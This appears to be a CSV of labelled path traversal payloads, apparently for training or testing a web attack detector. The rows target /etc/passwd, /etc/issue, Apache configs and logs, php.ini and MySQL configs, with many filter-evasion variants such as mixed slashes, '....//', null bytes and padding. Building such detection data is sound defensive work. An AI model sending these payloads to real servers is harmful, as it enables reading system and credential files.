Content,Category,Label
../../../etc/httpd.conf,traversal2,Attack
../../etc/httpd.conf,traversal2,Attack
../etc/httpd.conf,traversal2,Attack
../../../../../../../../../../../etc/httpd/conf/httpd.conf,traversal2,Attack
../../../../../../../../../../etc/httpd/conf/httpd.conf,traversal2,Attack
../../../../../../../../../etc/httpd/conf/httpd.conf,traversal2,Attack
../../../../../../../../etc/httpd/conf/httpd.conf,traversal2,Attack
../../../../../../../etc/httpd/conf/httpd.conf,traversal2,Attack
../../../../../../etc/httpd/conf/httpd.conf,traversal2,Attack
../../../../../etc/httpd/conf/httpd.conf,traversal2,Attack
../../../../etc/httpd/conf/httpd.conf,traversal2,Attack
../../../etc/httpd/conf/httpd.conf,traversal2,Attack
../../etc/httpd/conf/httpd.conf,traversal2,Attack
../etc/httpd/conf/httpd.conf,traversal2,Attack
../../../../../../../../../../../etc/httpd/httpd.conf,traversal2,Attack
../../../../../../../../../../etc/httpd/httpd.conf,traversal2,Attack
../../../../../../../../../etc/httpd/httpd.conf,traversal2,Attack
../../../../../../../../etc/httpd/httpd.conf,traversal2,Attack
../../../../../../../etc/httpd/httpd.conf,traversal2,Attack
../../../../../../etc/httpd/httpd.conf,traversal2,Attack
../../../../../etc/httpd/httpd.conf,traversal2,Attack
../../../../etc/httpd/httpd.conf,traversal2,Attack
../../../etc/httpd/httpd.conf,traversal2,Attack
../../etc/httpd/httpd.conf,traversal2,Attack
../etc/httpd/httpd.conf,traversal2,Attack
../../../../../../../../../../../etc/httpd/logs/acces.log,traversal2,Attack
../../../../../../../../../../../etc/httpd/logs/acces_log,traversal2,Attack
../../../../../../../../../../etc/httpd/logs/acces.log,traversal2,Attack
../../../../../../../../../../etc/httpd/logs/acces_log,traversal2,Attack
../../../../../../../../../etc/httpd/logs/acces.log,traversal2,Attack
../../../../../../../../../etc/httpd/logs/acces_log,traversal2,Attack
../../../../../../../../etc/httpd/logs/acces.log,traversal2,Attack
../../../../../../../../etc/httpd/logs/acces_log,traversal2,Attack
../../../../../../../etc/httpd/logs/acces.log,traversal2,Attack
../../../../../../../etc/httpd/logs/acces_log,traversal2,Attack
../../../../../../etc/httpd/logs/acces.log,traversal2,Attack
../../../../../../etc/httpd/logs/acces_log,traversal2,Attack
../../../../../etc/httpd/logs/acces.log,traversal2,Attack
../../../../../etc/httpd/logs/acces_log,traversal2,Attack
../../../../etc/httpd/logs/acces.log,traversal2,Attack
../../../../etc/httpd/logs/acces_log,traversal2,Attack
../../../etc/httpd/logs/acces.log,traversal2,Attack
../../../etc/httpd/logs/acces_log,traversal2,Attack
../../etc/httpd/logs/acces.log,traversal2,Attack
../../etc/httpd/logs/acces_log,traversal2,Attack
../etc/httpd/logs/acces.log,traversal2,Attack
../etc/httpd/logs/acces_log,traversal2,Attack
../../../../../etc/httpd/logs/access.log,traversal2,Attack
../../../../../etc/httpd/logs/access_log,traversal2,Attack
../../../../../../../../../../../etc/httpd/logs/error.log,traversal2,Attack
../../../../../../../../../../../etc/httpd/logs/error_log,traversal2,Attack
../../../../../../../../../../etc/httpd/logs/error.log,traversal2,Attack
../../../../../../../../../../etc/httpd/logs/error_log,traversal2,Attack
../../../../../../../../../etc/httpd/logs/error.log,traversal2,Attack
../../../../../../../../../etc/httpd/logs/error_log,traversal2,Attack
../../../../../../../../etc/httpd/logs/error.log,traversal2,Attack
../../../../../../../../etc/httpd/logs/error_log,traversal2,Attack
../../../../../../../etc/httpd/logs/error.log,traversal2,Attack
../../../../../../../etc/httpd/logs/error_log,traversal2,Attack
../../../../../../etc/httpd/logs/error.log,traversal2,Attack
../../../../../../etc/httpd/logs/error_log,traversal2,Attack
../../../../../etc/httpd/logs/error.log,traversal2,Attack
../../../../../etc/httpd/logs/error_log,traversal2,Attack
../../../../etc/httpd/logs/error.log,traversal2,Attack
../../../../etc/httpd/logs/error_log,traversal2,Attack
../../../etc/httpd/logs/error.log,traversal2,Attack
../../../etc/httpd/logs/error_log,traversal2,Attack
../../etc/httpd/logs/error.log,traversal2,Attack
../../etc/httpd/logs/error_log,traversal2,Attack
../etc/httpd/logs/error.log,traversal2,Attack
../etc/httpd/logs/error_log,traversal2,Attack
../../../../../../../../../../../etc/httpd/php.ini,traversal2,Attack
../../../../../../../../../../etc/httpd/php.ini,traversal2,Attack
../../../../../../../../../etc/httpd/php.ini,traversal2,Attack
../../../../../../../../etc/httpd/php.ini,traversal2,Attack
../../../../../../../etc/httpd/php.ini,traversal2,Attack
../../../../../../etc/httpd/php.ini,traversal2,Attack
../../../../../etc/httpd/php.ini,traversal2,Attack
../../../../etc/httpd/php.ini,traversal2,Attack
../../../etc/httpd/php.ini,traversal2,Attack
../../etc/httpd/php.ini,traversal2,Attack
../etc/httpd/php.ini,traversal2,Attack
../../../../../../../../../../../etc/http/httpd.conf,traversal2,Attack
../../../../../../../../../../etc/http/httpd.conf,traversal2,Attack
../../../../../../../../../etc/http/httpd.conf,traversal2,Attack
../../../../../../../../etc/http/httpd.conf,traversal2,Attack
../../../../../../../etc/http/httpd.conf,traversal2,Attack
../../../../../../etc/http/httpd.conf,traversal2,Attack
../../../../../etc/http/httpd.conf,traversal2,Attack
../../../../etc/http/httpd.conf,traversal2,Attack
../../../etc/http/httpd.conf,traversal2,Attack
../../etc/http/httpd.conf,traversal2,Attack
../etc/http/httpd.conf,traversal2,Attack
................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................../../../../../../etc/issue,traversal2,Attack
..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................\..\..\..\..\..\etc\issue,traversal2,Attack
......///......///......///......///......///......///etc///issue,traversal2,Attack
......///......///......///......///......///etc///issue,traversal2,Attack
......///......///......///......///etc///issue,traversal2,Attack
......///......///......///etc///issue,traversal2,Attack
......///......///etc///issue,traversal2,Attack
......///etc///issue,traversal2,Attack
....//....//....//....//....//....//etc//issue,traversal2,Attack
....//....//....//....//....//....//etc/issue,traversal2,Attack
....//....//....//....//....//etc//issue,traversal2,Attack
....//....//....//....//....//etc/issue,traversal2,Attack
....//....//....//....//etc//issue,traversal2,Attack
....//....//....//....//etc/issue,traversal2,Attack
....//....//....//etc//issue,traversal2,Attack
....//....//....//etc/issue,traversal2,Attack
....//....//etc//issue,traversal2,Attack
....//....//etc/issue,traversal2,Attack
....//etc//issue,traversal2,Attack
....//etc/issue,traversal2,Attack
..../\..../\..../\..../\..../\..../\etc/\issue,traversal2,Attack
..../\..../\..../\..../\..../\..../\etc\issue,traversal2,Attack
..../\..../\..../\..../\..../\etc/\issue,traversal2,Attack
..../\..../\..../\..../\..../\etc\issue,traversal2,Attack
..../\..../\..../\..../\etc/\issue,traversal2,Attack
..../\..../\..../\..../\etc\issue,traversal2,Attack
..../\..../\..../\etc/\issue,traversal2,Attack
..../\..../\..../\etc\issue,traversal2,Attack
..../\..../\etc/\issue,traversal2,Attack
..../\..../\etc\issue,traversal2,Attack
..../\etc/\issue,traversal2,Attack
..../\etc\issue,traversal2,Attack
.../.../.../.../.../.../etc/issue,traversal2,Attack
.../.../.../.../.../etc/issue,traversal2,Attack
.../.../.../.../etc/issue,traversal2,Attack
.../.../.../etc/issue,traversal2,Attack
.../.../etc/issue,traversal2,Attack
..././..././..././..././..././..././etc/issue,traversal2,Attack
..././..././..././..././..././etc/issue,traversal2,Attack
..././..././..././..././etc/issue,traversal2,Attack
..././..././..././etc/issue,traversal2,Attack
..././..././etc/issue,traversal2,Attack
..././etc/issue,traversal2,Attack
.../.\.../.\.../.\.../.\.../.\.../.\etc\issue,traversal2,Attack
.../.\.../.\.../.\.../.\.../.\etc\issue,traversal2,Attack
.../.\.../.\.../.\.../.\etc\issue,traversal2,Attack
.../.\.../.\.../.\etc\issue,traversal2,Attack
.../.\.../.\etc\issue,traversal2,Attack
.../.\etc\issue,traversal2,Attack
.../etc/issue,traversal2,Attack
...\...\...\...\...\...\etc\issue,traversal2,Attack
...\...\...\...\...\etc\issue,traversal2,Attack
...\...\...\...\etc\issue,traversal2,Attack
...\...\...\etc\issue,traversal2,Attack
...\...\etc\issue,traversal2,Attack
...\etc\issue,traversal2,Attack
../../../../../../etc/issue,traversal2,Attack
../../../../../etc/issue,traversal2,Attack
../../../../etc/issue,traversal2,Attack
../../../etc/issue,traversal2,Attack
../../etc/issue,traversal2,Attack
..//..//..//..//..//..//etc//issue,traversal2,Attack
..//..//..//..//..//etc//issue,traversal2,Attack
..//..//..//..//etc//issue,traversal2,Attack
..//..//..//etc//issue,traversal2,Attack
..//..//etc//issue,traversal2,Attack
..///..///..///..///..///..///etc///issue,traversal2,Attack
..///..///..///..///..///etc///issue,traversal2,Attack
..///..///..///..///etc///issue,traversal2,Attack
..///..///..///etc///issue,traversal2,Attack
..///..///etc///issue,traversal2,Attack
..///etc///issue,traversal2,Attack
..//etc//issue,traversal2,Attack
../\../\../\../\../\../\etc/\issue,traversal2,Attack
../\../\../\../\../\etc/\issue,traversal2,Attack
../\../\../\../\etc/\issue,traversal2,Attack
../\../\../\etc/\issue,traversal2,Attack
../\../\etc/\issue,traversal2,Attack
../\/../\/../\/../\/../\/../\/etc/\/issue,traversal2,Attack
../\/../\/../\/../\/../\/etc/\/issue,traversal2,Attack
../\/../\/../\/../\/etc/\/issue,traversal2,Attack
../\/../\/../\/etc/\/issue,traversal2,Attack
../\/../\/etc/\/issue,traversal2,Attack
../\/etc/\/issue,traversal2,Attack
../\etc/\issue,traversal2,Attack
../etc/issue,traversal2,Attack
..\..\..\..\..\..\etc\issue,traversal2,Attack
..\..\..\..\..\etc\issue,traversal2,Attack
..\..\..\..\etc\issue,traversal2,Attack
..\..\..\etc\issue,traversal2,Attack
..\..\etc\issue,traversal2,Attack
..\/..\/..\/..\/..\/..\/etc\/issue,traversal2,Attack
..\/..\/..\/..\/..\/etc\/issue,traversal2,Attack
..\/..\/..\/..\/etc\/issue,traversal2,Attack
..\/..\/..\/etc\/issue,traversal2,Attack
..\/..\/etc\/issue,traversal2,Attack
..\/\..\/\..\/\..\/\..\/\..\/\etc\/\issue,traversal2,Attack
..\/\..\/\..\/\..\/\..\/\etc\/\issue,traversal2,Attack
..\/\..\/\..\/\..\/\etc\/\issue,traversal2,Attack
..\/\..\/\..\/\etc\/\issue,traversal2,Attack
..\/\..\/\etc\/\issue,traversal2,Attack
..\/\etc\/\issue,traversal2,Attack
..\/etc\/issue,traversal2,Attack
..\\..\\..\\..\\..\\..\\etc\\issue,traversal2,Attack
..\\..\\..\\..\\..\\etc\\issue,traversal2,Attack
..\\..\\..\\..\\etc\\issue,traversal2,Attack
..\\..\\..\\etc\\issue,traversal2,Attack
..\\..\\etc\\issue,traversal2,Attack
..\\\..\\\..\\\..\\\..\\\..\\\etc\\\issue,traversal2,Attack
..\\\..\\\..\\\..\\\..\\\etc\\\issue,traversal2,Attack
..\\\..\\\..\\\..\\\etc\\\issue,traversal2,Attack
..\\\..\\\..\\\etc\\\issue,traversal2,Attack
..\\\..\\\etc\\\issue,traversal2,Attack
..\\\etc\\\issue,traversal2,Attack
..\\etc\\issue,traversal2,Attack
..\etc\issue,traversal2,Attack
./.././.././.././.././.././../etc/issue,traversal2,Attack
./.././.././.././.././../etc/issue,traversal2,Attack
./.././.././.././../etc/issue,traversal2,Attack
./.././.././../etc/issue,traversal2,Attack
./.././../etc/issue,traversal2,Attack
./../etc/issue,traversal2,Attack
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../etc/issue,traversal2,Attack
././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././..\..\etc\issue,traversal2,Attack
.//..//.//..//.//..//.//..//.//..//.//..//etc//issue,traversal2,Attack
.//..//.//..//.//..//.//..//.//..//etc//issue,traversal2,Attack
.//..//.//..//.//..//.//..//etc//issue,traversal2,Attack
.//..//.//..//.//..//etc//issue,traversal2,Attack
.//..//.//..//etc//issue,traversal2,Attack
.//..//etc//issue,traversal2,Attack
.?/.?/.?/.?/.?/.?/etc/issue,traversal2,Attack
.?/.?/.?/.?/.?/etc/issue,traversal2,Attack
.?/.?/.?/.?/etc/issue,traversal2,Attack
.?/.?/.?/etc/issue,traversal2,Attack
.?/.?/etc/issue,traversal2,Attack
.?/etc/issue,traversal2,Attack
.?\.?\.?\.?\.?\.?\etc\issue,traversal2,Attack
.?\.?\.?\.?\.?\etc\issue,traversal2,Attack
.?\.?\.?\.?\etc\issue,traversal2,Attack
.?\.?\.?\etc\issue,traversal2,Attack
.?\.?\etc\issue,traversal2,Attack
.?\etc\issue,traversal2,Attack
.\..\.\..\.\..\.\..\.\..\.\..\etc\issue,traversal2,Attack
.\..\.\..\.\..\.\..\.\..\etc\issue,traversal2,Attack
.\..\.\..\.\..\.\..\etc\issue,traversal2,Attack
.\..\.\..\.\..\etc\issue,traversal2,Attack
.\..\.\..\etc\issue,traversal2,Attack
.\..\etc\issue,traversal2,Attack
.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\../../etc\issue,traversal2,Attack
.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\..\..\etc\issue,traversal2,Attack
.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\etc\\issue,traversal2,Attack
.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\etc\\issue,traversal2,Attack
.\\..\\.\\..\\.\\..\\.\\..\\etc\\issue,traversal2,Attack
.\\..\\.\\..\\.\\..\\etc\\issue,traversal2,Attack
.\\..\\.\\..\\etc\\issue,traversal2,Attack
.\\..\\etc\\issue,traversal2,Attack
/..\/..\/..\/..\/..\/..\etc\/issue,traversal2,Attack
/..\/..\/..\/..\/..\etc\/issue,traversal2,Attack
/..\/..\/..\/..\etc\/issue,traversal2,Attack
/..\/..\/..\etc\/issue,traversal2,Attack
/..\/..\etc\/issue,traversal2,Attack
/..\etc\issue,traversal2,Attack
///../../../../../../etc///issue,traversal2,Attack
///../../../../../etc///issue,traversal2,Attack
///../../../../etc///issue,traversal2,Attack
///../../../etc///issue,traversal2,Attack
///../../etc///issue,traversal2,Attack
///../etc///issue,traversal2,Attack
///..\..\..\..\..\..\etc///issue,traversal2,Attack
///..\..\..\..\..\etc///issue,traversal2,Attack
///..\..\..\..\etc///issue,traversal2,Attack
///..\..\..\etc///issue,traversal2,Attack
///..\..\etc///issue,traversal2,Attack
///..\etc///issue,traversal2,Attack
?./?./?./?./?./?./etc/issue,traversal2,Attack
?./?./?./?./?./etc/issue,traversal2,Attack
?./?./?./?./etc/issue,traversal2,Attack
?./?./?./etc/issue,traversal2,Attack
?./?./etc/issue,traversal2,Attack
?./etc/issue,traversal2,Attack
?.\?.\?.\?.\?.\?.\etc\issue,traversal2,Attack
?.\?.\?.\?.\?.\etc\issue,traversal2,Attack
?.\?.\?.\?.\etc\issue,traversal2,Attack
?.\?.\?.\etc\issue,traversal2,Attack
?.\?.\etc\issue,traversal2,Attack
?.\etc\issue,traversal2,Attack
??/??/??/??/??/??/etc/issue,traversal2,Attack
??/??/??/??/??/etc/issue,traversal2,Attack
??/??/??/??/etc/issue,traversal2,Attack
??/??/??/etc/issue,traversal2,Attack
??/??/etc/issue,traversal2,Attack
??/etc/issue,traversal2,Attack
??\??\??\??\??\??\etc\issue,traversal2,Attack
??\??\??\??\??\etc\issue,traversal2,Attack
??\??\??\??\etc\issue,traversal2,Attack
??\??\??\etc\issue,traversal2,Attack
??\??\etc\issue,traversal2,Attack
??\etc\issue,traversal2,Attack
\../\../\../\../\../\../etc/\issue,traversal2,Attack
\../\../\../\../\../\../etc/issue,traversal2,Attack
\../\../\../\../\../etc/\issue,traversal2,Attack
\../\../\../\../\../etc/issue,traversal2,Attack
\../\../\../\../etc/\issue,traversal2,Attack
\../\../\../\../etc/issue,traversal2,Attack
\../\../\../etc/\issue,traversal2,Attack
\../\../\../etc/issue,traversal2,Attack
\../\../etc/\issue,traversal2,Attack
\../\../etc/issue,traversal2,Attack
\../etc/issue,traversal2,Attack
\../etc\issue,traversal2,Attack
\..\\..\\..\\..\\..\\..\etc\issue,traversal2,Attack
\..\\..\\..\\..\\..\etc\issue,traversal2,Attack
\..\\..\\..\\..\etc\issue,traversal2,Attack
\..\\..\\..\etc\issue,traversal2,Attack
\..\\..\etc\issue,traversal2,Attack
\..\etc\issue,traversal2,Attack
\\\../../../../../../etc\\\issue,traversal2,Attack
\\\../../../../../etc\\\issue,traversal2,Attack
\\\../../../../etc\\\issue,traversal2,Attack
\\\../../../etc\\\issue,traversal2,Attack
\\\../../etc\\\issue,traversal2,Attack
\\\../etc\\\issue,traversal2,Attack
\\\..\..\..\..\..\..\etc\\\issue,traversal2,Attack
\\\..\..\..\..\..\etc\\\issue,traversal2,Attack
\\\..\..\..\..\etc\\\issue,traversal2,Attack
\\\..\..\..\etc\\\issue,traversal2,Attack
\\\..\..\etc\\\issue,traversal2,Attack
\\\..\etc\\\issue,traversal2,Attack
../../../../../../etc/issue%00index.htm,traversal2,Attack
../../../../../etc/issue%00index.htm,traversal2,Attack
../../../../etc/issue%00index.htm,traversal2,Attack
../../../etc/issue%00index.htm,traversal2,Attack
../../etc/issue%00index.htm,traversal2,Attack
../etc/issue%00index.htm,traversal2,Attack
..\..\..\..\..\..\etc\issue%00index.htm,traversal2,Attack
..\..\..\..\..\etc\issue%00index.htm,traversal2,Attack
..\..\..\..\etc\issue%00index.htm,traversal2,Attack
..\..\..\etc\issue%00index.htm,traversal2,Attack
..\..\etc\issue%00index.htm,traversal2,Attack
..\etc\issue%00index.htm,traversal2,Attack
../../../../../../etc/issue%00index.html,traversal2,Attack
../../../../../etc/issue%00index.html,traversal2,Attack
../../../../etc/issue%00index.html,traversal2,Attack
../../../etc/issue%00index.html,traversal2,Attack
../../etc/issue%00index.html,traversal2,Attack
../etc/issue%00index.html,traversal2,Attack
..\..\..\..\..\..\etc\issue%00index.html,traversal2,Attack
..\..\..\..\..\etc\issue%00index.html,traversal2,Attack
..\..\..\..\etc\issue%00index.html,traversal2,Attack
..\..\..\etc\issue%00index.html,traversal2,Attack
..\..\etc\issue%00index.html,traversal2,Attack
..\etc\issue%00index.html,traversal2,Attack
../../../../../../etc/issue;index.htm,traversal2,Attack
../../../../../etc/issue;index.htm,traversal2,Attack
../../../../etc/issue;index.htm,traversal2,Attack
../../../etc/issue;index.htm,traversal2,Attack
../../etc/issue;index.htm,traversal2,Attack
../etc/issue;index.htm,traversal2,Attack
..\..\..\..\..\..\etc\issue;index.htm,traversal2,Attack
..\..\..\..\..\etc\issue;index.htm,traversal2,Attack
..\..\..\..\etc\issue;index.htm,traversal2,Attack
..\..\..\etc\issue;index.htm,traversal2,Attack
..\..\etc\issue;index.htm,traversal2,Attack
..\etc\issue;index.htm,traversal2,Attack
../../../../../../etc/issue;index.html,traversal2,Attack
../../../../../etc/issue;index.html,traversal2,Attack
../../../../etc/issue;index.html,traversal2,Attack
../../../etc/issue;index.html,traversal2,Attack
../../etc/issue;index.html,traversal2,Attack
../etc/issue;index.html,traversal2,Attack
..\..\..\..\..\..\etc\issue;index.html,traversal2,Attack
..\..\..\..\..\etc\issue;index.html,traversal2,Attack
..\..\..\..\etc\issue;index.html,traversal2,Attack
..\..\..\etc\issue;index.html,traversal2,Attack
..\..\etc\issue;index.html,traversal2,Attack
..\etc\issue;index.html,traversal2,Attack
../../../../../../../../../../../etc/logrotate.d/ftp,traversal2,Attack
../../../../../../../../../../etc/logrotate.d/ftp,traversal2,Attack
../../../../../../../../../etc/logrotate.d/ftp,traversal2,Attack
../../../../../../../../etc/logrotate.d/ftp,traversal2,Attack
../../../../../../../etc/logrotate.d/ftp,traversal2,Attack
../../../../../../etc/logrotate.d/ftp,traversal2,Attack
../../../../../etc/logrotate.d/ftp,traversal2,Attack
../../../../etc/logrotate.d/ftp,traversal2,Attack
../../../etc/logrotate.d/ftp,traversal2,Attack
../../etc/logrotate.d/ftp,traversal2,Attack
../etc/logrotate.d/ftp,traversal2,Attack
../../../../../../../../../../../etc/logrotate.d/proftpd,traversal2,Attack
../../../../../../../../../../etc/logrotate.d/proftpd,traversal2,Attack
../../../../../../../../../etc/logrotate.d/proftpd,traversal2,Attack
../../../../../../../../etc/logrotate.d/proftpd,traversal2,Attack
../../../../../../../etc/logrotate.d/proftpd,traversal2,Attack
../../../../../../etc/logrotate.d/proftpd,traversal2,Attack
../../../../../etc/logrotate.d/proftpd,traversal2,Attack
../../../../etc/logrotate.d/proftpd,traversal2,Attack
../../../etc/logrotate.d/proftpd,traversal2,Attack
../../etc/logrotate.d/proftpd,traversal2,Attack
../etc/logrotate.d/proftpd,traversal2,Attack
../../../../../../../../../../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../../../../../../../../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../../../../../../../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../../../../../../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../../../../../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../../../../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../../../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../etc/logrotate.d/vsftpd.log,traversal2,Attack
../etc/logrotate.d/vsftpd.log,traversal2,Attack
../../../../../../../../../../../etc/my.cnf,traversal2,Attack
../../../../../../../../../../etc/my.cnf,traversal2,Attack
../../../../../../../../../etc/my.cnf,traversal2,Attack
../../../../../../../../etc/my.cnf,traversal2,Attack
../../../../../../../etc/my.cnf,traversal2,Attack
../../../../../../etc/my.cnf,traversal2,Attack
../../../../../etc/my.cnf,traversal2,Attack
../../../../etc/my.cnf,traversal2,Attack
../../../etc/my.cnf,traversal2,Attack
../../etc/my.cnf,traversal2,Attack
../etc/my.cnf,traversal2,Attack
../../../../../../../../../../../etc/mysql/my.cnf,traversal2,Attack
../../../../../../../../../../etc/mysql/my.cnf,traversal2,Attack
../../../../../../../../../etc/mysql/my.cnf,traversal2,Attack
../../../../../../../../etc/mysql/my.cnf,traversal2,Attack
../../../../../../../etc/mysql/my.cnf,traversal2,Attack
../../../../../../etc/mysql/my.cnf,traversal2,Attack
../../../../../etc/mysql/my.cnf,traversal2,Attack
../../../../etc/mysql/my.cnf,traversal2,Attack
../../../etc/mysql/my.cnf,traversal2,Attack
../../etc/mysql/my.cnf,traversal2,Attack
../etc/mysql/my.cnf,traversal2,Attack
................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................../../../etc/passwd,traversal2,Attack
..................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................\..\..\..\..\etc\passwd,traversal2,Attack
......///......///......///......///......///......///etc///passwd,traversal2,Attack
......///......///......///......///......///etc///passwd,traversal2,Attack
......///......///......///......///etc///passwd,traversal2,Attack
......///......///......///etc///passwd,traversal2,Attack
......///......///etc///passwd,traversal2,Attack
......///etc///passwd,traversal2,Attack
....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd,traversal2,Attack
